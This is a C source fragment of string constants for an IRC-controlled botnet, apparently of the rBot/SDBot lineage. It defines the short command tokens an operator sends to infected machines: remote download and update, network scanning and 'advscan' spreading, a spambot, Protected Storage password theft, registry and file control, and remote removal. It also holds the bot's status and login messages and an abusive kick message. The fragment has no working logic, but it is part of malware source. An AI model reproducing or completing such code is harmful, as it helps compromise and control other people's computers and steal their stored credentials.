const char cmd_on[]			    = "on";
const char cmd_off[]			= "off";
const char cmd_all[]			= "all";

const char cmd_login_1[]		= "l";

const char cmd_threads_1[]		= "t";
const char cmd_threads_sub[]	= "sub";
const char cmd_threads_kill_1[]	= "k";

const char cmd_logout_1[]		= "lo";

const char cmd_who[]			= "who";

const char cmd_remove_1[]		= "gz";

#ifndef NO_DLLTEST
const char cmd_testdlls[]		= "dlls";
#endif

#ifndef NO_CEL
const char cmd_cel[]			= "cel";
#endif

const char cmd_uptime_1[]		= "up";

#ifndef NO_INSTALLED_TIME
const char cmd_insttime_1[]		= "it";
#endif

#ifndef NO_BOTVERSION
const char cmd_version_1[]		= "v";
#endif

#ifndef NO_STATUS
const char cmd_status_1[]		= "s";
#endif

#ifndef NO_SECURE
const char cmd_secure_1[]		= "sec";
const char cmd_unsecure_1[]		= "unsec";
#endif

#ifndef NO_PROCESS
const char cmd_process_1[]		= "ps";
#endif

const char cmd_nickupd_1[]		= "nu";
const char cmd_rndnick_1[]		= "rand";


#ifndef NO_VISIT
const char cmd_visit_1[]	    = "vst";
#endif

#ifndef NO_IESTART
const char cmd_iestart_1[] 		= "ies";
#endif

#ifdef _DEBUG
const char cmd_encrypt_1[]		= "enc";
#endif

const char cmd_server_1[]       = "server";

const char cmd_join_1[]			= "j";

const char cmd_part_1[]			= "p";

const char cmd_raw_1[]			= "r";

const char cmd_prefix_1[]		= "pr";

const char cmd_dns_1[]			= "dns";

#ifndef NO_ADVSCAN
const char cmd_currentip_1[]	= "cip";
const char cmd_banscan_1[]		= "ban";
const char cmd_advscan_1[]		= "asc";
const char cmd_scanall_1[]		= "sa";
#endif

#ifndef NO_FLUSHARP
const char cmd_flusharp_1[]		= "farp";
#endif

#ifndef NO_FLUSHDNS
const char cmd_flushdns_1[]		= "fdns";
#endif


#ifndef NO_SPAMBOT
const char cmd_spambot_1[]      = "spam";  
#endif

#ifndef NO_PSTORE
const char cmd_pstore_1[]		= "pst";
#endif

#ifndef NO_SYSINFO
const char cmd_sysinfo_1[]		= "si";
#endif

#ifndef NO_NETINFO
const char cmd_netinfo_1[]		= "ni";
#endif

#ifndef NO_REGCTRL
const char cmd_redctrl_1[]      = "reg";
#endif

#ifndef NO_MIRCCMD
const char cmd_mirccmd_1[] 		= "mirc";
const char cmd_mircinfo_1[]     = "minfo";
#endif

const char cmd_system_1[] 		= "sys";

#ifndef NO_FILECTRL
const char cmd_filectrl_1[]		= "f";
#endif

#ifndef NO_DOWNLOAD
const char cmd_download_1[]		= "wget";
const char cmd_update_1[]		= "upd";
#endif

#ifndef NO_IFELSE
const char cmd_if_1[]			= "i";
const char cmd_else_1[]			= "e";
const char cmd_ifelse_nick_1[]	= "n";
const char cmd_ifelse_host_1[]	= "h";
const char cmd_ifelse_id[]		= "id";
const char cmd_ifelse_uptime_1[]= "up";
const char cmd_ifelse_ruptime_1[]="rup";
const char cmd_ifelse_priv_1[]	= "p";
const char cmd_ifelse_status_1[]= "s";
const char cmd_ifelse_connected[] = "con";
#endif


char str_auth_good[]	= "%s Password accepted.";
char str_auth_full[]	= "%s Login failed, too many logged in users.";
char str_spy_privmsg[]	= "%s Possible spy: %s!%s@%s (Sent PM: \"%s\")";
char str_auth_bad[]		= "%s Failed authentication by: %s!%s@%s (Pass Tried: %s)";

char str_logout[]		= "%s User %s logged out.";
char str_sl_logout[]	= "%s Slot <%i> logged out.";
char str_sl_no_logout[]	= "%s No user logged in at slot: <%i>";
char str_sl_in_logout[]	= "%s Invalid login slot number: <%i>";

char str_thread_stop[]	= "%s Stopped: <%d> thread(s).";
char str_thread_ac[]	= "%s No active threads found.";
char str_thread_kill[]	= "%s Killed thread: <%s>";
char str_thread_fkill[]	= "%s Failed to kill thread: <%s>";
char str_thread_alr[]	= "%s %s already running at thread number: <%d>.";
char str_thread_fail[]	= "%s Failed to start %s, error: <%d>.";

char str_status[]		= "%s Status: %s. Box Uptime: %s, Bot Uptime: %s, Connected for: %s.";

char str_installed[]	= "%s Bot installed on: %s.";

char str_kick_msg[]		= "Go fuck yourself %s.";


char str_auth_ali[]		= "%s You are already logged in.";
char str_quit_rem[]		= "Remove command received from: %s!%s@%s";
char str_quit_upd[]		= "Update command received.";
char str_noadvapi[]		= "%s Advapi.dll is not loaded.";
char str_nopstore[]		= "%s PStore.dll is not loaded.";


char str_main_thread[]	= "%s Main bot thread.";
char str_rup_thread[]	= "%s Record uptime checker.";
char str_asecure_thread[]= "%s Auto-Secure.";

char str_bad_format[]	= "%s Missing parameter(s).";

char str_exip_resolve[] = "Couldn't resolve host";
